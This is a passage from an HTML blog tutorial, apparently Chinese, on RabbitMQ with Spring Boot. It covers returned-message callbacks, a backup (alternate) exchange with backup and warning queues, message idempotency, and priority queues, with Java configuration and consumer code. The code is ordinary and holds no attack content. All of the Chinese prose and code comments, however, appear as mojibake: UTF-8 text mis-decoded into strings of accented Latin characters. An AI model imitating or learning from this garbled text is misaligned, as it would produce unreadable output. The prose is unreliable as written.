é€’è¿‡ç¨‹ä¸­ä¸å¯è¾¾ç›®çš„çš„æ—¶å°†æ¶ˆæ¯è¿”å›ç»™ç”Ÿäº§è€…</span><br>    <span class="hljs-comment">//åªæœ‰ä¸å¯è¾¾ç›®çš„åœ°çš„æ—¶å€™æ‰å¯å›é€€</span><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">returnedMessage</span><span class="hljs-params">(Message message, <span class="hljs-type">int</span> replyCode, String replyText, String exchange, String routingKey)</span> &#123;<br>        log.error(<span class="hljs-string">&quot;æ¶ˆæ¯&#123;&#125;ï¼Œè¢«äº¤æ¢æœº&#123;&#125;é€€å›ï¼Œé€€å›çš„åŸå› ï¼š&#123;&#125;,è·¯ç”±Keyï¼š&#123;&#125;,replyCodeï¼š&#123;&#125;&quot;</span><br>                ,<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody()),<br>                exchange,<br>                replyText,<br>                routingKey,<br>                replyCode<br>                );<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>å‘å¸ƒæµ‹è¯•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// å¼€å§‹å‘æ¶ˆæ¯ æµ‹è¯•ç¡®è®¤</span><br><span class="hljs-meta">@RestController</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@RequestMapping(&quot;/confirm&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProducerController</span> &#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    <span class="hljs-keyword">private</span> RabbitTemplate rabbitTemplate;<br><br>    <span class="hljs-comment">//å‘æ¶ˆæ¯</span><br>    <span class="hljs-meta">@GetMapping(&quot;/sendMessage/&#123;message&#125;&quot;)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">sendMessage</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> String message)</span>&#123;<br>        <span class="hljs-type">CorrelationData</span> <span class="hljs-variable">correlationData</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(<span class="hljs-string">&quot;1&quot;</span>);<br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                ,ConfirmConfig.CONFIRM_routing_key<br>                ,message+<span class="hljs-string">&quot;key1&quot;</span>,correlationData);<br>        log.info(<span class="hljs-string">&quot;å‘é€æ¶ˆæ¯å†…å®¹ï¼š&#123;&#125;&quot;</span>,message+<span class="hljs-string">&quot;key1&quot;</span>);<br><br>        <span class="hljs-type">CorrelationData</span> <span class="hljs-variable">correlationData2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CorrelationData</span>(<span class="hljs-string">&quot;2&quot;</span>);<br>        rabbitTemplate.convertAndSend(ConfirmConfig.CONFIRM_EXCHANGE_NAME<br>                ,ConfirmConfig.CONFIRM_routing_key+<span class="hljs-string">&quot;2&quot;</span><br>                ,message+<span class="hljs-string">&quot;key12&quot;</span>,correlationData2);<br>        log.info(<span class="hljs-string">&quot;å‘é€æ¶ˆæ¯å†…å®¹ï¼š&#123;&#125;&quot;</span>,message+<span class="hljs-string">&quot;key12&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ•ˆæœï¼šå®ç°å›é€€æ¶ˆæ¯æˆåŠŸï¼</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113152945118.png" alt="image-20230113152945118" /></p></li></ol><h2 id="92-å¤‡ä»½äº¤æ¢æœº"><a class="markdownIt-Anchor" href="#92-å¤‡ä»½äº¤æ¢æœº"></a> 9.2 å¤‡ä»½äº¤æ¢æœº</h2><p>â€‹æœ‰äº†mandatory å‚æ•°å’Œå›é€€æ¶ˆæ¯ï¼Œæˆ‘ä»¬è·å¾—äº†å¯¹æ— æ³•æŠ•é€’æ¶ˆæ¯çš„æ„ŸçŸ¥èƒ½åŠ›ï¼Œæœ‰æœºä¼šåœ¨ç”Ÿäº§è€…çš„æ¶ˆæ¯æ— æ³•è¢«æŠ•é€’æ—¶å‘ç°å¹¶å¤„ç†ã€‚ä½†æœ‰æ—¶å€™ï¼Œæˆ‘ä»¬å¹¶ä¸çŸ¥é“è¯¥å¦‚ä½•å¤„ç†è¿™äº›æ— æ³•è·¯ç”±çš„æ¶ˆæ¯ï¼Œæœ€å¤šæ‰“ä¸ªæ—¥å¿—ï¼Œç„¶åè§¦å‘æŠ¥è­¦ï¼Œå†æ¥æ‰‹åŠ¨å¤„ç†ã€‚è€Œé€šè¿‡æ—¥å¿—æ¥å¤„ç†è¿™äº›æ— æ³•è·¯ç”±çš„æ¶ˆæ¯æ˜¯å¾ˆä¸ä¼˜é›…çš„åšæ³•ï¼Œç‰¹åˆ«æ˜¯å½“ç”Ÿäº§è€…æ‰€åœ¨çš„æœåŠ¡æœ‰å¤šå°æœºå™¨çš„æ—¶å€™ï¼Œæ‰‹åŠ¨å¤åˆ¶æ—¥å¿—ä¼šæ›´åŠ éº»çƒ¦è€Œä¸”å®¹æ˜“å‡ºé”™ã€‚è€Œä¸”è®¾ç½®mandatoryå‚æ•°ä¼šå¢åŠ ç”Ÿäº§è€…çš„å¤æ‚æ€§ï¼Œéœ€è¦æ·»åŠ å¤„ç†è¿™äº›è¢«é€€å›çš„æ¶ˆæ¯çš„é€»è¾‘ã€‚å¦‚æœæ—¢ä¸æƒ³ä¸¢å¤±æ¶ˆæ¯ï¼Œåˆä¸æƒ³å¢åŠ ç”Ÿäº§è€…çš„å¤æ‚æ€§ï¼Œè¯¥æ€ä¹ˆåšå‘¢?å‰é¢åœ¨è®¾ç½®æ­»ä¿¡é˜Ÿåˆ—çš„æ–‡ç« ä¸­ï¼Œæˆ‘ä»¬æåˆ°ï¼Œå¯ä»¥ä¸ºé˜Ÿåˆ—è®¾ç½®æ­»ä¿¡äº¤æ¢æœºæ¥å­˜å‚¨é‚£äº›å¤„ç†å¤±è´¥çš„æ¶ˆæ¯ï¼Œå¯æ˜¯è¿™äº›ä¸å¯è·¯ç”±æ¶ˆæ¯æ ¹æœ¬æ²¡æœ‰æœºä¼šè¿›å…¥åˆ°é˜Ÿåˆ—ï¼Œå› æ­¤æ— æ³•ä½¿ç”¨æ­»ä¿¡é˜Ÿåˆ—æ¥ä¿å­˜æ¶ˆæ¯ã€‚åœ¨RabbitMQ.ä¸­ï¼Œæœ‰ä¸€ç§å¤‡ä»½äº¤æ¢æœºçš„æœºåˆ¶å­˜åœ¨ï¼Œå¯ä»¥å¾ˆå¥½çš„åº”å¯¹è¿™ä¸ªé—®é¢˜ã€‚ä»€ä¹ˆæ˜¯å¤‡ä»½äº¤æ¢æœºå‘¢?å¤‡ä»½äº¤æ¢æœºå¯ä»¥ç†è§£ä¸º RabbitMQä¸­äº¤æ¢æœºçš„â€œå¤‡èƒâ€ï¼Œå½“æˆ‘ä»¬ä¸ºæŸä¸€ä¸ªäº¤æ¢æœºå£°æ˜ä¸€ä¸ªå¯¹åº”çš„å¤‡ä»½äº¤æ¢æœºæ—¶ï¼Œå°±æ˜¯ä¸ºå®ƒåˆ›å»ºä¸€ä¸ªå¤‡èƒï¼Œå½“äº¤æ¢æœºæ¥æ”¶åˆ°ä¸€æ¡ä¸å¯è·¯ç”±æ¶ˆæ¯æ—¶ï¼Œå°†ä¼šæŠŠè¿™æ¡æ¶ˆæ¯è½¬å‘åˆ°å¤‡ä»½äº¤æ¢æœºä¸­ï¼Œç”±å¤‡ä»½äº¤æ¢æœºæ¥è¿›è¡Œè½¬å‘å’Œå¤„ç†ï¼Œé€šå¸¸å¤‡ä»½äº¤æ¢æœºçš„ç±»å‹ä¸ºFanoutï¼Œè¿™æ ·å°±èƒ½æŠŠæ‰€æœ‰æ¶ˆæ¯éƒ½æŠ•é€’åˆ°ä¸å…¶ç»‘å®šçš„é˜Ÿåˆ—ä¸­ï¼Œç„¶åæˆ‘ä»¬åœ¨å¤‡ä»½äº¤æ¢æœºä¸‹ç»‘å®šä¸€ä¸ªé˜Ÿåˆ—ï¼Œè¿™æ ·æ‰€æœ‰é‚£äº›åŸäº¤æ¢æœºæ— æ³•è¢«è·¯ç”±çš„æ¶ˆæ¯ï¼Œå°±ä¼šéƒ½è¿›å…¥è¿™ä¸ªé˜Ÿåˆ—äº†ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å»ºç«‹ä¸€ä¸ªæŠ¥è­¦é˜Ÿåˆ—ï¼Œç”¨ç‹¬ç«‹çš„æ¶ˆè´¹è€…æ¥è¿›è¡Œç›‘æµ‹å’ŒæŠ¥è­¦ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113153217940.png" alt="image-20230113153217940" /></p><ol><li><p>é…ç½®ç±»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// é…ç½®ç±»ï¼šå‘å¸ƒç¡®è®¤ï¼ˆé«˜çº§ï¼‰</span><br><span class="hljs-meta">@Configuration</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConfirmConfig</span> &#123;<br><br>    <span class="hljs-comment">//äº¤æ¢æœº</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;confirm_exchange&quot;</span>;<br>    <span class="hljs-comment">//é˜Ÿåˆ—</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;confirm_queue&quot;</span>;<br>    <span class="hljs-comment">//RoutingKey</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONFIRM_routing_key</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;key1&quot;</span>;<br>    <span class="hljs-comment">//å¤‡ä»½äº¤æ¢æœº</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BACKUP_EXCHANGE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;backup_exchange&quot;</span>;<br>    <span class="hljs-comment">//å¤‡ä»½é˜Ÿåˆ—</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">BACKUP_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;backup_queue&quot;</span>;<br>    <span class="hljs-comment">//æŠ¥è­¦é˜Ÿåˆ—</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">WARNING_QUEUE_NAME</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;warning_queue&quot;</span>;<br><br>    <span class="hljs-comment">//å£°æ˜äº¤æ¢æœº</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> DirectExchange <span class="hljs-title function_">confirmExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> ExchangeBuilder.directExchange(CONFIRM_EXCHANGE_NAME).durable(<span class="hljs-literal">true</span>)<br>                .withArgument(<span class="hljs-string">&quot;alternate-exchange&quot;</span>,BACKUP_EXCHANGE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">confirmQueue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(CONFIRM_QUEUE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-comment">//ç»‘å®š</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">queueBindingExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;confirmQueue&quot;)</span> Queue confirmQueue,</span><br><span class="hljs-params">                                        <span class="hljs-meta">@Qualifier(&quot;confirmExchange&quot;)</span>DirectExchange confirmExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(confirmQueue).to(confirmExchange).with(CONFIRM_routing_key);<br>    &#125;<br><br>    <span class="hljs-comment">//å¤‡ä»½äº¤æ¢æœº</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> FanoutExchange <span class="hljs-title function_">backupExchange</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FanoutExchange</span>(BACKUP_EXCHANGE_NAME);<br>    &#125;<br><br>    <span class="hljs-comment">//å¤‡ä»½é˜Ÿåˆ—</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">backupQueue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(BACKUP_QUEUE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-comment">//æŠ¥è­¦é˜Ÿåˆ—</span><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Queue <span class="hljs-title function_">warningQueue</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> QueueBuilder.durable(WARNING_QUEUE_NAME).build();<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">backupQueueBindingBackupExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;backupQueue&quot;)</span> Queue backupQueue,</span><br><span class="hljs-params">                                                    <span class="hljs-meta">@Qualifier(&quot;backupExchange&quot;)</span> FanoutExchange backupExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(backupQueue).to(backupExchange);<br>    &#125;<br><br>    <span class="hljs-meta">@Bean</span><br>    <span class="hljs-keyword">public</span> Binding <span class="hljs-title function_">warningQueueBindingBackupExchange</span><span class="hljs-params">(<span class="hljs-meta">@Qualifier(&quot;warningQueue&quot;)</span> Queue backupQueue,</span><br><span class="hljs-params">                                                    <span class="hljs-meta">@Qualifier(&quot;backupExchange&quot;)</span> FanoutExchange backupExchange)</span>&#123;<br>        <span class="hljs-keyword">return</span> BindingBuilder.bind(backupQueue).to(backupExchange);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆè´¹è€…</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-comment">// æŠ¥è­¦æ¶ˆè´¹è€…</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@Slf4j</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WarningConsumer</span> &#123;<br><br>    <span class="hljs-comment">//æ¥å—æŠ¥è­¦æ¶ˆæ¯</span><br>    <span class="hljs-meta">@RabbitListener(queues = ConfirmConfig.WARNING_QUEUE_NAME)</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">receiveWarningMsg</span><span class="hljs-params">(Message message)</span>&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(message.getBody());<br>        log.error(<span class="hljs-string">&quot;æŠ¥è­¦å‘ç°ä¸å¯è·¯ç”±æ¶ˆæ¯ï¼š&#123;&#125;&quot;</span>,msg);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>é‡æ–°å¯åŠ¨é¡¹ç›®çš„æ—¶å€™éœ€è¦æŠŠåŸæ¥çš„ confirm.exchange åˆ é™¤å› ä¸ºæˆ‘ä»¬ä¿®æ”¹äº†å…¶ç»‘å®šå±æ€§ã€‚</p></li><li><p>æ•ˆæœ</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113155426899.png" alt="image-20230113155426899" /></p></li><li><p>mandatoryå‚æ•°ä¸å¤‡ä»½äº¤æ¢æœºå¯ä»¥ä¸€èµ·ä½¿ç”¨çš„æ—¶å€™ï¼Œå¦‚æœä¸¤è€…åŒæ—¶å¼€å¯ï¼Œæ¶ˆæ¯ç©¶ç«Ÿä½•å»ä½•ä»?è°ä¼˜å…ˆçº§é«˜ï¼Œç»è¿‡ä¸Šé¢ç»“æœæ˜¾ç¤ºç­”æ¡ˆæ˜¯<code>å¤‡ä»½äº¤æ¢æœºä¼˜å…ˆçº§é«˜</code>ã€‚</p></li></ol><h1 id="10-rabbitmq-å…¶ä»–çŸ¥è¯†ç‚¹"><a class="markdownIt-Anchor" href="#10-rabbitmq-å…¶ä»–çŸ¥è¯†ç‚¹"></a> <strong>10. RabbitMQ</strong> <strong>å…¶ä»–çŸ¥è¯†ç‚¹</strong></h1><h2 id="101-å¹‚ç­‰æ€§"><a class="markdownIt-Anchor" href="#101-å¹‚ç­‰æ€§"></a> 10.1 å¹‚ç­‰æ€§</h2><blockquote><p>æ¦‚å¿µ</p></blockquote><p>ç”¨æˆ·å¯¹äºåŒä¸€æ“ä½œå‘èµ·çš„ä¸€æ¬¡è¯·æ±‚æˆ–è€…å¤šæ¬¡è¯·æ±‚çš„ç»“æœæ˜¯ä¸€è‡´çš„,ä¸ä¼šå› ä¸ºå¤šæ¬¡ç‚¹å‡»è€Œäº§ç”Ÿäº†å‰¯ä½œç”¨ã€‚ä¸¾ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼Œé‚£å°±æ˜¯æ”¯ä»˜ï¼Œç”¨æˆ·è´­ä¹°å•†å“åæ”¯ä»˜ï¼Œæ”¯ä»˜æ‰£æ¬¾æˆåŠŸï¼Œä½†æ˜¯è¿”å›ç»“æœçš„æ—¶å€™ç½‘ç»œå¼‚å¸¸ï¼Œæ­¤æ—¶é’±å·²ç»æ‰£äº†ï¼Œç”¨æˆ·å†æ¬¡ç‚¹å‡»æŒ‰é’®ï¼Œæ­¤æ—¶ä¼šè¿›è¡Œç¬¬äºŒæ¬¡æ‰£æ¬¾ï¼Œè¿”å›ç»“æœæˆåŠŸï¼Œç”¨æˆ·æŸ¥è¯¢ä½™é¢å‘ç°å¤šæ‰£é’±äº†ï¼Œæµæ°´è®°å½•ä¹Ÿå˜æˆäº†ä¸¤æ¡ã€‚åœ¨ä»¥å‰çš„å•åº”ç”¨ç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦æŠŠæ•°æ®æ“ä½œæ”¾å…¥äº‹åŠ¡ä¸­å³å¯ï¼Œå‘ç”Ÿé”™è¯¯ç«‹å³å›æ»šï¼Œä½†æ˜¯å†å“åº”å®¢æˆ·ç«¯çš„æ—¶å€™ä¹Ÿæœ‰å¯èƒ½å‡ºç°ç½‘ç»œä¸­æ–­æˆ–è€…å¼‚å¸¸ç­‰ç­‰</p><blockquote><p>è§£å†³æ€è·¯</p></blockquote><ol><li><p>MQæ¶ˆè´¹è€…çš„å¹‚ç­‰æ€§çš„è§£å†³ä¸€èˆ¬ä½¿ç”¨å…¨å±€IDæˆ–è€…å†™ä¸ªå”¯ä¸€æ ‡è¯†æ¯”å¦‚æ—¶é—´æˆ³æˆ–è€…UUIDæˆ–è€…è®¢å•æ¶ˆè´¹è€…æ¶ˆè´¹MQä¸­çš„æ¶ˆæ¯ä¹Ÿå¯åˆ©ç”¨MQçš„è¯¥idæ¥åˆ¤æ–­ï¼Œæˆ–è€…å¯æŒ‰è‡ªå·±çš„è§„åˆ™ç”Ÿæˆä¸€ä¸ªå…¨å±€å”¯ä¸€idï¼Œæ¯æ¬¡æ¶ˆè´¹æ¶ˆæ¯æ—¶ç”¨è¯¥idå…ˆåˆ¤æ–­è¯¥æ¶ˆæ¯æ˜¯å¦å·²æ¶ˆè´¹è¿‡ã€‚</p></li><li><p>åœ¨æµ·é‡è®¢å•ç”Ÿæˆçš„ä¸šåŠ¡é«˜å³°æœŸï¼Œç”Ÿäº§ç«¯æœ‰å¯èƒ½å°±ä¼šé‡å¤å‘ç”Ÿäº†æ¶ˆæ¯ï¼Œè¿™æ—¶å€™æ¶ˆè´¹ç«¯å°±è¦å®ç°å¹‚ç­‰æ€§ï¼Œè¿™å°±æ„å‘³ç€æˆ‘ä»¬çš„æ¶ˆæ¯æ°¸è¿œä¸ä¼šè¢«æ¶ˆè´¹å¤šæ¬¡,å³ä½¿æˆ‘ä»¬æ”¶åˆ°äº†ä¸€æ ·çš„æ¶ˆæ¯ã€‚ä¸šç•Œä¸»æµçš„å¹‚ç­‰æ€§æœ‰ä¸¤ç§æ“ä½œ:a.å”¯ä¸€ID+æŒ‡çº¹ç æœºåˆ¶,åˆ©ç”¨æ•°æ®åº“ä¸»é”®å»é‡, b.åˆ©ç”¨redisçš„åŸå­æ€§å»å®ç°</p><ul><li><p><code>å”¯ä¸€ID+æŒ‡çº¹ç æœºåˆ¶</code>ï¼š</p><p>æŒ‡çº¹ç :æˆ‘ä»¬çš„ä¸€äº›è§„åˆ™æˆ–è€…æ—¶é—´æˆ³åŠ åˆ«çš„æœåŠ¡ç»™åˆ°çš„å”¯ä¸€ä¿¡æ¯ç ,å®ƒå¹¶ä¸ä¸€å®šæ˜¯æˆ‘ä»¬ç³»ç»Ÿç”Ÿæˆçš„ï¼ŒåŸºæœ¬éƒ½æ˜¯ç”±æˆ‘ä»¬çš„ä¸šåŠ¡è§„åˆ™æ‹¼æ¥è€Œæ¥ï¼Œä½†æ˜¯ä¸€å®šè¦ä¿è¯å”¯ä¸€æ€§ï¼Œç„¶åå°±åˆ©ç”¨æŸ¥è¯¢è¯­å¥è¿›è¡Œåˆ¤æ–­è¿™ä¸ªidæ˜¯å¦å­˜åœ¨æ•°æ®åº“ä¸­,ä¼˜åŠ¿å°±æ˜¯å®ç°ç®€å•å°±ä¸€ä¸ªæ‹¼æ¥ï¼Œç„¶åæŸ¥è¯¢åˆ¤æ–­æ˜¯å¦é‡å¤;åŠ£åŠ¿å°±æ˜¯åœ¨é«˜å¹¶å‘æ—¶ï¼Œå¦‚æœæ˜¯å•ä¸ªæ•°æ®åº“å°±ä¼šæœ‰å†™å…¥æ€§èƒ½ç“¶é¢ˆå½“ç„¶ä¹Ÿå¯ä»¥é‡‡ç”¨åˆ†åº“åˆ†è¡¨æå‡æ€§èƒ½ï¼Œä½†ä¹Ÿä¸æ˜¯æˆ‘ä»¬æœ€æ¨èçš„æ–¹å¼ã€‚</p></li><li><p><code>RedisåŸå­æ€§</code>ï¼š</p><p>åˆ©ç”¨redisæ‰§è¡Œsetnxå‘½ä»¤ï¼Œå¤©ç„¶å…·æœ‰å¹‚ç­‰æ€§ï¼Œä»è€Œå®ç°ä¸é‡å¤æ¶ˆè´¹</p></li></ul></li></ol><h2 id="102-ä¼˜å…ˆçº§é˜Ÿåˆ—"><a class="markdownIt-Anchor" href="#102-ä¼˜å…ˆçº§é˜Ÿåˆ—"></a> 10.2 ä¼˜å…ˆçº§é˜Ÿåˆ—</h2><blockquote><p>ä½¿ç”¨åœºæ™¯</p></blockquote><p>åœ¨æˆ‘ä»¬ç³»ç»Ÿä¸­æœ‰ä¸€ä¸ªè®¢å•å‚¬ä»˜çš„åœºæ™¯ï¼Œæˆ‘ä»¬çš„å®¢æˆ·åœ¨å¤©çŒ«ä¸‹çš„è®¢å•,æ·˜å®ä¼šåŠæ—¶å°†è®¢å•æ¨é€ç»™æˆ‘ä»¬ï¼Œå¦‚<br />æœåœ¨ç”¨æˆ·è®¾å®šçš„æ—¶é—´å†…æœªä»˜æ¬¾é‚£ä¹ˆå°±ä¼šç»™ç”¨æˆ·æ¨é€ä¸€æ¡çŸ­ä¿¡æé†’ï¼Œå¾ˆç®€å•çš„ä¸€ä¸ªåŠŸèƒ½å¯¹å§ï¼Œä½†æ˜¯ï¼Œtmallå•†å®¶å¯¹æˆ‘ä»¬æ¥è¯´ï¼Œè‚¯å®šæ˜¯è¦åˆ†å¤§å®¢æˆ·å’Œå°å®¢æˆ·çš„å¯¹å§ï¼Œæ¯”å¦‚åƒè‹¹æœï¼Œå°ç±³è¿™æ ·å¤§å•†å®¶ä¸€å¹´èµ·ç èƒ½ç»™æˆ‘ä»¬åˆ›é€ å¾ˆå¤§çš„åˆ©æ¶¦ï¼Œæ‰€ä»¥ç†åº”å½“ç„¶ï¼Œä»–ä»¬çš„è®¢å•å¿…é¡»å¾—åˆ°ä¼˜å…ˆå¤„ç†ï¼Œè€Œæ›¾ç»æˆ‘ä»¬çš„åç«¯ç³»ç»Ÿæ˜¯ä½¿ç”¨redis.,æ¥å­˜æ”¾çš„å®šæ—¶è½®è¯¢ï¼Œå¤§å®¶éƒ½çŸ¥é“redis,åªèƒ½ç”¨Liståšä¸€ä¸ªç®€ç®€å•å•çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶ä¸èƒ½å®ç°ä¸€ä¸ªä¼˜å…ˆçº§çš„åœºæ™¯ï¼Œæ‰€ä»¥è®¢å•é‡å¤§äº†åé‡‡ç”¨RabbitMQè¿›è¡Œæ”¹é€ å’Œä¼˜åŒ–,å¦‚æœå‘ç°æ˜¯å¤§å®¢æˆ·çš„è®¢å•ç»™ä¸€ä¸ªç›¸å¯¹æ¯”è¾ƒé«˜çš„ä¼˜å…ˆçº§ï¼Œå¦åˆ™å°±æ˜¯é»˜è®¤ä¼˜å…ˆçº§ã€‚</p><blockquote><p>å¦‚ä½•æ·»åŠ </p></blockquote><ol><li><p>æ§åˆ¶å°é¡µé¢æ·»åŠ </p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/image-20230113160255482.png" alt="image-20230113160255482" /></p></li><li><p>é˜Ÿåˆ—ä¸­ä»£ç æ·»åŠ ä¼˜å…ˆçº§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">Map&lt;String, Object&gt; params = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>params.put(<span class="hljs-string">&quot;x-max-priority&quot;</span>,<span class="hljs-number">10</span>);<br>channel.queueDeclare(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>,<span class="hljs-literal">false</span>,params);<br></code></pre></td></tr></table></figure></li><li><p>æ¶ˆæ¯ä¸­ä»£ç æ·»åŠ ä¼˜å…ˆçº§</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">AMQP.<span class="hljs-type">BasicProperties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>        <span class="hljs-title class_">AMQP</span>.BasicProperties().builder().priority(<span 